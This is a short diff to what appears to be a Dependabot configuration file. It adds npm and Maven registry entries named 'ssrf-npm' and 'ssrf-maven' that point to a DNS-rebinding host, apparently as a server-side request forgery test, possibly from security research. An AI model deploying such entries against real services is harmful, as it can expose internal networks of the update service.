@@ -1,13 +1,19 @@
 version: 2
 registries:
-  npm-internal:
+  ssrf-npm:
     type: npm-registry
-    url: http://t1.rebind.beeli.id/npm-registry
-    token: test
+    url: http://t1.rebind.beeli.id/dependabot-npm
+    token: fake
+  ssrf-maven:
+    type: maven-repository
+    url: http://t1.rebind.beeli.id/dependabot-maven
+    username: test
+    password: test
+
 updates:
-  - package-ecosystem: npm
-    directory: /
+  - package-ecosystem: "npm"
+    directory: "/"
     schedule:
-      interval: daily
+      interval: "daily"
     registries:
-      - npm-internal
+      - ssrf-npm
